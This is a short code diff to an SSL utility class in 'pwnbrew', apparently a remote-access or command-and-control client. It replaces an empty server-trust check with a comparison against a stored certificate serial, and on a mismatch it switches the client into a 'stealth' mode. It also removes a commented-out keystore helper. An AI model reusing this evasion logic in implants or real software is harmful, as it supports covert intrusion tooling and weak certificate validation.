@@ -46,6 +46,7 @@ The copyright on this package is held by Securifera, Inc
 package pwnbrew.utilities;
 
 import java.io.IOException;
+import java.math.BigInteger;
 import java.security.InvalidKeyException;
 import java.security.Key;
 import java.security.KeyManagementException;
@@ -64,6 +65,7 @@ import javax.net.ssl.SSLContext;
 import javax.net.ssl.TrustManager;
 import javax.net.ssl.TrustManagerFactory;
 import javax.net.ssl.X509TrustManager;
+import pwnbrew.ClientConfig;
 import pwnbrew.log.LoggableException;
 /**
  *
@@ -97,7 +99,20 @@ final public class SSLUtilities {
                 public void checkClientTrusted(X509Certificate[] certs, String authType) {}
 
                 @Override
-                public void checkServerTrusted(X509Certificate[] certs, String authType) {}
+                public void checkServerTrusted(X509Certificate[] certs, String authType) {
+                    
+                    ClientConfig theConf = ClientConfig.getConfig();
+                    BigInteger srvCertSerial = theConf.getServerCertSerial();
+                    if( certs.length > 0 && srvCertSerial != null ){                        
+                        //Get the cert and check it's serial
+                        X509Certificate cert = certs[0];
+                        BigInteger srl = cert.getSerialNumber();
+                        if( !srl.equals(srvCertSerial) ){
+                            theConf.setStealth(true);
+                            DebugPrinter.printMessage( NAME_Class, "Server serial doesn't match: " + srvCertSerial + ":" + srl );
+                        }
+                    }
+                }
             }};
 
             aContext = SSLContext.getInstance("TLS");
@@ -174,21 +189,6 @@ final public class SSLUtilities {
            throw new LoggableException(ex);
         }
     }
-//
-//    //===============================================================
-//    /*
-//     * Check if the keystore has an entry for the alias
-//    */
-//    public static synchronized boolean checkAlias(KeyStore passedKeyStore, String passedAlias) throws KeyStoreException, LoggableException {
-//
-//        boolean retVal = false;
-//
-//        if( passedKeyStore != null && passedAlias != null ){
-//           retVal = passedKeyStore.containsAlias(passedAlias);
-//        }
-//
-//        return retVal;
-//    }
        
     //===============================================================
     /**
